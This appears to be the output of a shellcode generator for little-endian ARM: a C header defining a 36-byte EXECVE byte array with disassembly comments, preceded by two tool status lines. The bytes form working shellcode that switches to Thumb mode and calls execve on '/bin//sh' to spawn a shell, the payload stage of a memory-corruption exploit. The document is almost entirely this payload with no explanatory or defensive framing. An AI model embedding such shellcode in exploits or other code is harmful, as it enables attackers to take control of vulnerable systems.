
checking arm
added 1 modes
// Target architecture : ARM arm
// Endian mode         : little

#define EXECVE_SIZE 36

char EXECVE[] = {
  /* 0000 */ "\x14\x00\x9f\xe5" /* ldr  r0, [pc, #0x14] */
  /* 0004 */ "\x14\x10\x9f\xe5" /* ldr  r1, [pc, #0x14] */
  /* 0008 */ "\x01\x20\x8f\xe2" /* add  r2, pc, #1      */
  /* 000C */ "\x12\xff\x2f\xe1" /* bx   r2              */
  /* 0010 */ "\x52\x40"         /* eors r2, r2          */
  /* 0012 */ "\x07\xb4"         /* push {r0, r1, r2}    */
  /* 0014 */ "\x68\x46"         /* mov  r0, sp          */
  /* 0016 */ "\x49\x40"         /* eors r1, r1          */
  /* 0018 */ "\x0b\x27"         /* movs r7, #0xb        */
  /* 001A */ "\x01\xdf"         /* svc  #1              */
  /* 001C */ "\x2f\x62\x69\x6e"
  /* 0020 */ "\x2f\x2f\x73\x68"
};